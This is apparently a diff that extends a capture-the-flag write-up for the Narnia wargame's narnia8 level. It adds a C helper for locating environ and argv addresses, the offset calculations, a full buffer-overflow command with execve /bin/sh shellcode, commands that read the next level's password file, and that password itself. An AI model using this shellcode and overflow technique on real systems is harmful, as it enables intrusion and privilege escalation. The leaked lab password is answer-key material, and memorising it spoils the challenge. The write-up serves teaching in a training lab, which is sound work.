@@ -225,10 +225,97 @@ c
 
 ![](12.png)
 
+It worked, we got a shell.<br />
+Now it remains to do the same thing outside of gdb.
+
+The problem is - we don't know the addresses now.<br />
+But, if we only manage to find out the address of `envinron`, we will win, because we can calculate the other addresses from it.
 
 
+```
+cd $(mktemp -d)
+```
+```
+vim getenv.c
+```
+```c
+/* /tmp/tmp.W5iNoFSMZz/getenv.c */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+        char *environ = getenv("SHELL")-strlen("SHELL=");
+        char *argv_1 = NULL;
+        char *argv_2 = NULL;
+
+        printf("%p: %s\n", argv[0], argv[0]);
+
+        if(argc == 2){
+            argv_1 = environ - strlen(argv[1]) - 1;
+            printf("%p: %s\n", argv_1, argv_1);
+        }
+
+        if(argc == 3){
+            argv_1 = environ - ((strlen(argv[1]) + 1) + (strlen(argv[2]) + 1));
+            argv_2 = argv_1 + strlen(argv[1]) + 1;
+            printf("%p: %s\n", argv_1, argv_1);
+            printf("%p: %s\n", argv_2, argv_2);
+        }
+
+        printf("%p: %s\n", environ, environ);
+
+        return 0;
+}
+```
+```
+gcc -m32 getenv.c -o getenv
+```
+
+![](13.png)
+
+And indeed, according to the formula (in this case of input: `subtracting 67` bytes from envinron for `argv[1]`, and `adding 33` to `argv[1]` to reach `argv[2]`) the correct addresses were indeed obtained:
+
+![](14.png)
+
+* 0xffffd777 = 0xffffd7ba - 67
+* 0xffffd798 = 0xffffd7ba - 67 + 33
+
+By trial and error, it can be concluded that the position where the `environ` is set depends on the length of the name of the script.<br/>
+If the name increases by one character, 2 characters must be subtracted from the addresses.<br />
+If the name decreases by one character, 2 characters must be added to the addresses.
+
+So,
+
+* len("/tmp/tmp.W5iNoFSMZz/getenv") == 26
+* len("./narnia8") == 9
+* 17 == 26 - 9
+* 0xffffd799 == 0xffffd777 + 17*2
+* 0xffffd7ba == 0xffffd798 + 17*2
+
+```
+./narnia8 $(perl -e 'print "A"x20, "\x99\xd7\xff\xff", "BBBB", "\xba\xd7\xff\xff"')
+ $(perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62
+\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
+```
+```
+whoami
+```
+```
+id
+```
+```
+cat /etc/narnia_pass/narnia9
+```
+
+![](15.png)
+
+```
+rm -r /tmp/tmp.W5iNoFSMZz # remove your temp directory
+```
 
 ## Password for the next level:
 ```
-
+eRfb1uJaeO
 ```
